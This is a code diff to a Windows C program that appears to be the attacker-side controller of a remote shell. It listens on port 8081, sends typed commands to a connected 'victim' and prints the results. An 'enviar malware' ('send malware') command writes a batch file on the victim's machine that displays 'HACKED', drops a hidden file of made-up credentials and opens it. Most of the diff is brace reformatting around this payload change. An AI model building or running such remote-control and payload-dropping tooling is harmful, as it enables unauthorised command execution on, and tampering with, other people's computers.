@@ -9,8 +9,7 @@
 #define PORT 8081
 #define BUFFER_SIZE 4096
 
-int main()
-{
+int main() {
     WSADATA wsa;
     SOCKET listener, client;
     struct sockaddr_in server, client_addr;
@@ -19,14 +18,12 @@ int main()
     char response[BUFFER_SIZE];
     int bytes_received;
 
-    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
-    {
+    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
         printf("[!] WSAStartup failed\n");
         return 1;
     }
 
-    if ((listener = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
-    {
+    if ((listener = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
         printf("[!] Socket creation failed\n");
         WSACleanup();
         return 1;
@@ -36,8 +33,7 @@ int main()
     server.sin_addr.s_addr = INADDR_ANY;
     server.sin_port = htons(PORT);
 
-    if (bind(listener, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR)
-    {
+    if (bind(listener, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
         printf("[!] Bind failed\n");
         closesocket(listener);
         WSACleanup();
@@ -48,8 +44,7 @@ int main()
     printf("[*] Waiting for connection on port %d...\n", PORT);
 
     client = accept(listener, (struct sockaddr *)&client_addr, &client_len);
-    if (client == INVALID_SOCKET)
-    {
+    if (client == INVALID_SOCKET) {
         printf("[!] Accept failed\n");
         closesocket(listener);
         WSACleanup();
@@ -59,87 +54,76 @@ int main()
     printf("[+] Connection from %s\n", inet_ntoa(client_addr.sin_addr));
     printf("[*] Type 'help' for commands\n\n");
 
-    while (1)
-    {
+    while (1) {
         printf("Shell> ");
         fgets(command, sizeof(command), stdin);
         command[strcspn(command, "\n")] = '\0';
 
-        if (strcmp(command, "exit") == 0)
-            break;
-
-        if (strcmp(command, "help") == 0)
-        {
+        if (strcmp(command, "exit") == 0) break;
+        
+        if (strcmp(command, "help") == 0) {
             printf("\nCommands:\n");
             printf("cd [dir]    - Change directory and show new location\n");
             printf("cd..        - Go up one directory and show new location\n");
             printf("dir         - List files in current directory\n");
             printf("pwd         - Show current directory\n");
-            printf("enviar malware - Cria um arquivo batch que exibe 'HACKED' e abre credenciais\n");
+            printf("enviar malware - Cria um arquivo batch personalizado\n");
             printf("exit        - Quit\n\n");
             continue;
         }
 
-        if (strcmp(command, "enviar malware") == 0)
-        {
+        if (strcmp(command, "enviar malware") == 0) {
             char filename[256];
-
+            
             printf("Digite o nome do arquivo batch (sem extensao): ");
             fgets(filename, sizeof(filename), stdin);
             filename[strcspn(filename, "\n")] = '\0';
-
-            if (strstr(filename, ".bat") == NULL)
-            {
+            
+            if (strstr(filename, ".bat") == NULL) {
                 strcat(filename, ".bat");
             }
-
-            // Comando para criar o arquivo .bat
+            
             char bat_command[BUFFER_SIZE];
-            snprintf(bat_command, sizeof(bat_command),
-                     "echo @echo off > \"%s\" && "
-                     "echo echo -- Credenciais para nǜo esquecer -- > %%APPDATA%%\\ceoData.txt && "
-                     "echo echo Nome: connorLewinsky@cybertech.cia >> %%APPDATA%%\\ceoData.txt && "
-                     "echo echo Senha: eo{96*GYC]k8.cia >> %%APPDATA%%\\ceoData.txt && "
-                     "echo echo Credencial: 0000-1 >> %%APPDATA%%\\ceoData.txt && "
-                     "echo start \"\" \"%%APPDATA%%\\ceoData.txt\" >> \"%s\" && "
-                     "echo pause >> \"%s\"",
-                     filename, filename, filename);
-
+            snprintf(bat_command, sizeof(bat_command), 
+                "echo @echo off > \"%s\" && "
+                "echo echo HACKED >> \"%s\" && "
+                "echo echo -- Credenciais para nǜo esquecer -- > ceoData.txt >> \"%s\" && "
+                "echo echo Nome: connorLewinsky@cybertech.cia >> ceoData.txt >> \"%s\" && "
+                "echo echo Senha: eo{96*GYC]k8.cia >> ceoData.txt >> \"%s\" && "
+                "echo echo Credencial: 0000-1 >> ceoData.txt >> \"%s\" && "
+                "echo attrib +h ceoData.txt >> \"%s\" && "
+                "echo start \"\" \"ceoData.txt\" >> \"%s\" && "
+                "echo pause >> \"%s\"",
+                filename, filename, filename, filename, filename, filename, filename, filename);
+            
             printf("[*] Criando arquivo %s na vitima...\n", filename);
-
-            if (send(client, bat_command, strlen(bat_command), 0) <= 0)
-            {
+            
+            if (send(client, bat_command, strlen(bat_command), 0) <= 0) {
                 printf("[!] Connection lost\n");
                 break;
             }
-
-            while ((bytes_received = recv(client, response, BUFFER_SIZE - 1, 0)) > 0)
-            {
+            
+            while ((bytes_received = recv(client, response, BUFFER_SIZE-1, 0)) > 0) {
                 response[bytes_received] = '\0';
                 printf("%s", response);
-                if (strstr(response, "[CMD_END]"))
-                    break;
+                if (strstr(response, "[CMD_END]")) break;
             }
-
+            
             continue;
         }
 
-        if (send(client, command, strlen(command), 0) <= 0)
-        {
+        if (send(client, command, strlen(command), 0) <= 0) {
             printf("[!] Connection lost\n");
             break;
         }
 
-        while ((bytes_received = recv(client, response, BUFFER_SIZE - 1, 0)) > 0)
-        {
+        while ((bytes_received = recv(client, response, BUFFER_SIZE-1, 0)) > 0) {
             response[bytes_received] = '\0';
             printf("%s", response);
-            if (strstr(response, "[CMD_END]"))
-                break;
+            if (strstr(response, "[CMD_END]")) break;
         }
 
-        if (bytes_received <= 0)
-        {
+        if (bytes_received <= 0) {
             printf("[!] Connection error\n");
             break;
         }
